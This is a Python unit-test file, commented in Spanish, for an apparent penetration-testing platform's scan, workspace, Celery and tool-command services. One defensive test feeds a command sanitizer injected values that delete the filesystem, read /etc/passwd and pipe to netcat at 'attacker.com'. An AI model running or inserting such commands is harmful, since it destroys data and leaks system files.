"""
Unit Tests - Services
=====================

Tests para la capa de servicios (Business Logic Layer).
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime

from services import (
    ScanningService,
    ReconnaissanceService,
    VulnerabilityService,
    ExploitationService
)
from repositories import ScanRepository, WorkspaceRepository
from models.scan import Scan


class TestScanningService:
    """Tests para ScanningService."""
    
    @pytest.fixture
    def scanning_service(self):
        """Fixture de ScanningService."""
        return ScanningService()
    
    def test_create_scan(self, scanning_service, workspace, admin_user, session):
        """Test de creación de scan."""
        result = scanning_service.scan_repo.create(
            scan_type='reconnaissance',
            target='192.168.1.1',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={'tool': 'nmap'}
        )
        
        assert result is not None
        assert result.scan_type == 'reconnaissance'
        assert result.target == '192.168.1.1'
        assert result.status == 'pending'
    
    def test_get_scan_by_id(self, scanning_service, scan, session):
        """Test de obtención de scan por ID."""
        result = scanning_service.scan_repo.find_by_id(scan.id)
        
        assert result is not None
        assert result.id == scan.id
        assert result.target == scan.target
    
    def test_update_scan_status(self, scanning_service, scan, session):
        """Test de actualización de estado de scan."""
        scanning_service.scan_repo.update_status(scan, 'completed')
        session.commit()
        
        updated_scan = scanning_service.scan_repo.find_by_id(scan.id)
        
        assert updated_scan.status == 'completed'
    
    def test_update_scan_progress(self, scanning_service, scan, session):
        """Test de actualización de progreso de scan."""
        scanning_service.scan_repo.update_progress(scan, 75, 'Scanning in progress')
        session.commit()
        
        updated_scan = scanning_service.scan_repo.find_by_id(scan.id)
        
        assert updated_scan.progress == 75
        assert updated_scan.output == 'Scanning in progress'
    
    def test_list_scans_by_workspace(self, scanning_service, workspace, admin_user, session):
        """Test de listado de scans por workspace."""
        # Crear múltiples scans
        for i in range(3):
            scanning_service.scan_repo.create(
                scan_type='reconnaissance',
                target=f'192.168.1.{i+1}',
                workspace_id=workspace.id,
                user_id=admin_user.id,
                options={}
            )
        
        session.commit()
        
        scans = scanning_service.scan_repo.find_by_workspace(workspace.id)
        
        assert len(scans) >= 3
    
    def test_delete_scan(self, scanning_service, scan, session):
        """Test de eliminación de scan."""
        scan_id = scan.id
        
        scanning_service.scan_repo.delete(scan)
        session.commit()
        
        deleted_scan = scanning_service.scan_repo.find_by_id(scan_id)
        
        assert deleted_scan is None


class TestReconnaissanceService:
    """Tests para ReconnaissanceService."""
    
    @pytest.fixture
    def recon_service(self):
        """Fixture de ReconnaissanceService."""
        return ReconnaissanceService()
    
    @patch('subprocess.run')
    def test_start_nmap_scan_valid_target(self, mock_run, recon_service, workspace, admin_user, mock_nmap_output):
        """Test de inicio de scan Nmap con target válido."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout=mock_nmap_output,
            stderr=''
        )
        
        # En un entorno real, esto lanzaría la task de Celery
        # Aquí solo verificamos que la validación pasa
        from utils.validators import DomainValidator
        
        # Test validación de IP
        assert DomainValidator.is_valid_domain('192.168.1.1') is True
        
        # Test validación de dominio
        assert DomainValidator.is_valid_domain('example.com') is True
    
    def test_nmap_invalid_target(self, recon_service):
        """Test de Nmap con target inválido."""
        from utils.validators import DomainValidator
        
        with pytest.raises(ValueError):
            DomainValidator.is_valid_domain('localhost')
        
        with pytest.raises(ValueError):
            DomainValidator.is_valid_domain('127.0.0.1')
    
    @patch('subprocess.run')
    def test_masscan_execution(self, mock_run, recon_service, workspace, admin_user):
        """Test de ejecución de Masscan."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout='{"ip": "192.168.1.1", "ports": [{"port": 80, "proto": "tcp"}]}',
            stderr=''
        )
        
        # Verificar que el comando se puede construir
        from utils.validators import CommandSanitizer
        
        command = ['masscan', '192.168.1.1', '-p', '80', '--rate', '1000']
        sanitized = CommandSanitizer.sanitize_command(command[0], command[1:])
        
        assert sanitized[0] == 'masscan'
        assert '192.168.1.1' in sanitized


class TestVulnerabilityService:
    """Tests para VulnerabilityService."""
    
    @pytest.fixture
    def vuln_service(self):
        """Fixture de VulnerabilityService."""
        return VulnerabilityService()
    
    @patch('subprocess.run')
    def test_nuclei_scan(self, mock_run, vuln_service, workspace, admin_user, mock_nuclei_output):
        """Test de scan con Nuclei."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout=mock_nuclei_output,
            stderr=''
        )
        
        # Verificar construcción de comando
        from utils.validators import CommandSanitizer
        
        command = ['nuclei', '-u', 'https://example.com', '-severity', 'critical,high']
        sanitized = CommandSanitizer.sanitize_command(command[0], command[1:])
        
        assert sanitized[0] == 'nuclei'
        assert 'https://example.com' in sanitized
    
    def test_create_vulnerability(self, vuln_service, workspace, session):
        """Test de creación de vulnerabilidad."""
        from models.vulnerability import Vulnerability
        
        vuln = Vulnerability(
            title='SQL Injection',
            description='SQL injection found in login form',
            severity='high',
            target='https://example.com/login',
            workspace_id=workspace.id
        )
        
        session.add(vuln)
        session.commit()
        
        assert vuln.id is not None
        assert vuln.title == 'SQL Injection'
        assert vuln.severity == 'high'


class TestExploitationService:
    """Tests para ExploitationService."""
    
    @pytest.fixture
    def exploit_service(self):
        """Fixture de ExploitationService."""
        return ExploitationService()
    
    @patch('subprocess.run')
    def test_sqlmap_scan(self, mock_run, exploit_service, workspace, admin_user, mock_sqlmap_output):
        """Test de scan con SQLMap."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout=mock_sqlmap_output,
            stderr=''
        )
        
        # Verificar construcción de comando
        from utils.validators import CommandSanitizer
        
        command = ['sqlmap', '-u', 'https://example.com/?id=1', '--batch']
        sanitized = CommandSanitizer.sanitize_command(command[0], command[1:])
        
        assert sanitized[0] == 'sqlmap'
        assert '--batch' in sanitized
    
    def test_command_injection_prevention(self, exploit_service):
        """Test de prevención de command injection."""
        from utils.validators import CommandSanitizer
        
        # Intentar inyección de comando
        with pytest.raises(ValueError):
            CommandSanitizer.sanitize_command('nmap', ['192.168.1.1; rm -rf /'])
        
        with pytest.raises(ValueError):
            CommandSanitizer.sanitize_command('nmap', ['192.168.1.1 && cat /etc/passwd'])
        
        with pytest.raises(ValueError):
            CommandSanitizer.sanitize_command('nmap', ['192.168.1.1 | nc attacker.com 4444'])


class TestScanRepository:
    """Tests para ScanRepository."""
    
    @pytest.fixture
    def scan_repo(self):
        """Fixture de ScanRepository."""
        return ScanRepository()
    
    def test_find_by_status(self, scan_repo, workspace, admin_user, session):
        """Test de búsqueda por estado."""
        # Crear scans con diferentes estados
        scan_repo.create(
            scan_type='reconnaissance',
            target='192.168.1.1',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={}
        )
        
        scan2 = scan_repo.create(
            scan_type='reconnaissance',
            target='192.168.1.2',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={}
        )
        
        scan_repo.update_status(scan2, 'completed')
        session.commit()
        
        # Buscar por estado
        pending_scans = [s for s in scan_repo.find_by_workspace(workspace.id) if s.status == 'pending']
        completed_scans = [s for s in scan_repo.find_by_workspace(workspace.id) if s.status == 'completed']
        
        assert len(pending_scans) >= 1
        assert len(completed_scans) >= 1
    
    def test_find_by_type(self, scan_repo, workspace, admin_user, session):
        """Test de búsqueda por tipo."""
        # Crear scans de diferentes tipos
        scan_repo.create(
            scan_type='reconnaissance',
            target='192.168.1.1',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={}
        )
        
        scan_repo.create(
            scan_type='exploitation',
            target='192.168.1.2',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={}
        )
        
        session.commit()
        
        # Buscar por tipo
        recon_scans = scan_repo.find_by_workspace(workspace.id, scan_type='reconnaissance')
        exploit_scans = scan_repo.find_by_workspace(workspace.id, scan_type='exploitation')
        
        assert len(recon_scans) >= 1
        assert len(exploit_scans) >= 1


class TestWorkspaceRepository:
    """Tests para WorkspaceRepository."""
    
    @pytest.fixture
    def workspace_repo(self):
        """Fixture de WorkspaceRepository."""
        return WorkspaceRepository()
    
    def test_create_workspace(self, workspace_repo, admin_user, session):
        """Test de creación de workspace."""
        workspace = workspace_repo.create(
            name='Test Workspace',
            description='Test description',
            owner_id=admin_user.id
        )
        
        session.commit()
        
        assert workspace.id is not None
        assert workspace.name == 'Test Workspace'
        assert workspace.owner_id == admin_user.id
        assert workspace.is_active is True
    
    def test_find_by_owner(self, workspace_repo, admin_user, session):
        """Test de búsqueda por owner."""
        # Crear múltiples workspaces
        for i in range(3):
            workspace_repo.create(
                name=f'Workspace {i}',
                description='Test',
                owner_id=admin_user.id
            )
        
        session.commit()
        
        workspaces = workspace_repo.find_by_owner(admin_user.id)
        
        assert len(workspaces) >= 3
    
    def test_update_workspace(self, workspace_repo, workspace, session):
        """Test de actualización de workspace."""
        workspace.name = 'Updated Workspace'
        workspace.description = 'Updated description'
        
        workspace_repo.update(workspace)
        session.commit()
        
        updated = workspace_repo.find_by_id(workspace.id)
        
        assert updated.name == 'Updated Workspace'
        assert updated.description == 'Updated description'
    
    def test_delete_workspace(self, workspace_repo, workspace, session):
        """Test de eliminación de workspace."""
        workspace_id = workspace.id
        
        workspace_repo.delete(workspace)
        session.commit()
        
        deleted = workspace_repo.find_by_id(workspace_id)
        
        assert deleted is None


class TestCeleryIntegration:
    """Tests de integración con Celery."""
    
    def test_celery_task_execution(self, celery_app):
        """Test de ejecución de task de Celery."""
        from celery_app import debug_task
        
        # Ejecutar task (en modo eager)
        result = debug_task.delay()
        
        assert result.successful()
        assert result.result['status'] == 'ok'
    
    @patch('tasks.scanning_tasks.subprocess.run')
    def test_nmap_task_success(self, mock_run, celery_app, workspace, admin_user, session, mock_nmap_output):
        """Test de task de Nmap exitosa."""
        from tasks.scanning_tasks import nmap_scan_task
        
        mock_run.return_value = Mock(
            returncode=0,
            stdout=mock_nmap_output,
            stderr=''
        )
        
        # Crear scan
        scan_repo = ScanRepository()
        scan = scan_repo.create(
            scan_type='reconnaissance',
            target='192.168.1.1',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={'scan_type': 'quick'}
        )
        session.commit()
        
        # Ejecutar task
        result = nmap_scan_task.apply(args=[scan.id, '192.168.1.1', {'scan_type': 'quick'}])
        
        assert result.successful()
        assert result.result['status'] == 'completed'
    
    @patch('tasks.scanning_tasks.subprocess.run')
    def test_nmap_task_failure(self, mock_run, celery_app, workspace, admin_user, session):
        """Test de task de Nmap fallida."""
        from tasks.scanning_tasks import nmap_scan_task
        
        mock_run.return_value = Mock(
            returncode=1,
            stdout='',
            stderr='Nmap error: invalid target'
        )
        
        # Crear scan
        scan_repo = ScanRepository()
        scan = scan_repo.create(
            scan_type='reconnaissance',
            target='invalid_target',
            workspace_id=workspace.id,
            user_id=admin_user.id,
            options={}
        )
        session.commit()
        
        # Ejecutar task (debería fallar pero retry automático)
        with pytest.raises(Exception):
            nmap_scan_task.apply(args=[scan.id, 'invalid_target', {}])


if __name__ == '__main__':
    pytest.main([__file__, '-v'])



